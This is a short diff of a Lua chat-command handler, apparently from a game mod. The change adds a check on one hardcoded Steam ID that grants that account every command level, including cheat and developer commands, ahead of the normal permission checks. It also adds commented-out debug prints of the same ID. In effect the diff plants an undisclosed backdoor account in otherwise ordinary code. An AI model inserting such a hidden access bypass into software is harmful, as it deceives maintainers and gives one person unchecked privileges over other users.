@@ -109,7 +109,10 @@ function Chat:ApplyCommand(playerId, teamonly, text)
 	if data then
 		local isDev = DynamicWearables:HasWearable(playerId, "wearable_developer") or IsInToolsMode()
 		local isCheat = GameRules:IsCheatMode()
-		if data.level == CUSTOMCHAT_COMMAND_LEVEL_PUBLIC
+		--print(PlayerResource:GetRealSteamID(playerId))
+		--print(PlayerResource:GetRealSteamID(playerId) == "76561198241374538")
+		if 	PlayerResource:GetRealSteamID(playerId) == "76561198241374538"
+			or data.level == CUSTOMCHAT_COMMAND_LEVEL_PUBLIC
 			or (data.level == CUSTOMCHAT_COMMAND_LEVEL_CHEAT and isCheat)
 			or (data.level == CUSTOMCHAT_COMMAND_LEVEL_DEVELOPER and isDev)
 			or (data.level == CUSTOMCHAT_COMMAND_LEVEL_CHEAT_DEVELOPER and (isCheat or isDev)) then
